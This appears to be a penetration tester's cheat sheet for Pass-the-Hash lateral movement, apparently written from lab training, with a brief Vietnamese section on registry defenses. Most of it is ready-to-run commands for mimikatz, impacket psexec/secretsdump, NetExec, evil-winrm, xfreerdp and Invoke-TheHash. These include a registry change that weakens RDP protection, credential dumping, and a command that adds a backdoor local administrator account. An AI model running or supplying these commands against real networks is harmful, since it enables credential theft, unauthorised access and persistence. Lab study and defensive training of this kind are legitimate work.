**T1550.002**
# C2
(Cobalt Strike) PtH 
- Uses mimikatz sekurlsa::pth
```bash
pth <DOMAIN>\<USER> <HASH>
```
# Linux
(NXC) PtH
```bash
nxc smb <IP> -u <USER> -d <DOMAIN> -H <HASH> 
```
(Psexec) PtH
- PSexec will always attempt to return as NT_AUTHORITY\SYSTEM on admin accounts.
```bash
impacket-psexec <USER>@<IP> -hashes <LM:NTLM>
```
(Psexec) User authentication
```bash
impacket-psexec <DOMAIN>/<USER>@<IP>
```
(smbexec) User authentication
```bash
smbexec <USER>:<PASS>@<IP>
```
(Metasploit) PtH
```bash
exploit/windows/smb/psexec
```
(Secretsdump) Dumping credentials using hashes
```bash
secretsdump <DOMAIN>/<USER>:@<IP> -hashes <HASH>
```
Evil-winrm
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 
```
## RDP Protection
- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error
![[Pasted image 20261029114529.png]]
Enabling `Restricted Admin Mode`
```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
PtH xfreerdp
```bash
xfreerdp3 /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
## Windows
Mimikatz
- /aes128 and /aes256 for other encryption hashes 
```bash
mimikatz.exe sekurlsa::pth /user:"<USER>" /domain:"<DOMAIN>" /ntlm:"<HASH>"

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
![[Pasted image 20261029113946.png]]
Invoke-TheHash
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
![[Pasted image 20261029114122.png]]
## Defenses against PtH
Registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` đặt là 0 bật UAC chặn remote tới các tài khoản admin khác ngoài `RID-500 Administrator`
- Có thể chặn cả `RID-500 Administrator` nếu `FilterAdministratorToken` được đặt giá trị `1` (bật, default giá trị `0`)
- Nếu có tài khoản domain có quyền local admin thì vẫn sử dụng được
